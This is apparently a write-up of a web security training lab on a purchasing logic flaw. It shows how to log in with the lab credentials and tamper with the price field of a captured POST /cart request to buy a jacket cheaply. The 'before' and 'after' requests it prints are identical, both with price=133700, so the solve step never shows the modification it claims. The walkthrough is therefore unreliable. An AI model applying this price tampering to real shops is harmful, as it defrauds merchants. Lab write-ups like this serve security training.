## Excessive trust in client-side controls

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter

## Notes

- /login
- /cart

## Resume

1. Login with wiener:peter
2. Capture a **POST** `/cart` request when adding the "Lightweight l33t leather jacket"
3. Modifiy the `price=`
4. Buy the "Lightweight l33t leather jacket"

## Solve 

First login with wiener:peter and do the entire workflow trying to buy a "Lightweight l33t leather jacket" and remove everything from cart. Then modify the request : 

```
POST /cart HTTP/2
Host: 0aa50050042f7547838f9c2700bd000e.web-security-academy.net
Cookie: session=i6sU2RlIlIbToznZPPTGcEBdMfQaHkKU
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0aa50050042f7547838f9c2700bd000e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa50050042f7547838f9c2700bd000e.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


productId=1&redir=PRODUCT&quantity=1&price=133700
```

To : 

```
POST /cart HTTP/2
Host: 0aa50050042f7547838f9c2700bd000e.web-security-academy.net
Cookie: session=i6sU2RlIlIbToznZPPTGcEBdMfQaHkKU
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0aa50050042f7547838f9c2700bd000e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa50050042f7547838f9c2700bd000e.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


productId=1&redir=PRODUCT&quantity=1&price=133700
```

We can now access our cart and buy the "Lightweight l33t leather jacket"